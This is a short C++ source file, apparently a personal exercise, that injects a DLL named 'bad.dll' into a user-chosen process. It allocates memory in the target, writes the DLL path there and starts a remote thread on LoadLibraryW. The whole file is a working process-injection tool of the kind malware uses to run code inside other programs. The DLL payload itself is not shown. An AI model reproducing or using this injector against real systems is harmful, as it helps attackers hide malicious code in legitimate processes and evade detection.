#include <iostream>
#include <Windows.h>
#include <array>
#include <string>

int main()
{

	std::array<wchar_t, 45> dllPath[] = { L"C:\\Users\\Vic\\source\\repos\\InjectCode\\bad.dll" };


	std::string pid_q{};
	std::cout << "Enter PID to inject into" << std::endl;
	std::cin >> pid_q;

	DWORD pid = std::stoi(pid_q);

	HANDLE processHandle = OpenProcess(
		PROCESS_QUERY_INFORMATION |		 // For Alloc
		PROCESS_CREATE_THREAD |			 // For CreateRemoteThread
		PROCESS_VM_OPERATION |			 // For VirtualAllocEx
		PROCESS_VM_WRITE,				 // For WriteProcessMemory
		FALSE, 
		pid
	);


	if (processHandle != NULL)
	{
		//allocate memory in target proc
		PVOID remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof(dllPath), MEM_COMMIT, PAGE_READWRITE);

		//write path of DLL to newly allocated memory in target proc
		WriteProcessMemory(processHandle, remoteBuffer, dllPath, sizeof(dllPath), NULL);

		//Prepare the address of the LoadLibraryW function from Kernel32 in the target proc
		//The address will be used as the function to execute in the remote thread
		PTHREAD_START_ROUTINE functionToExecuteAddress = (PTHREAD_START_ROUTINE)GetProcAddress(
			GetModuleHandle(L"Kernel32"), 
			"LoadLibraryW"
		);

		//Create a remote thread in the target proc and tell it to execute the function with argument remote buffer (dllpath)
		CreateRemoteThread(processHandle, NULL, 0, functionToExecuteAddress, remoteBuffer, 0, NULL);

		CloseHandle(processHandle);

	}
	else
	{
		std::cout << "Failed to get handle" << std::endl;
	}
	
	return 0;
}

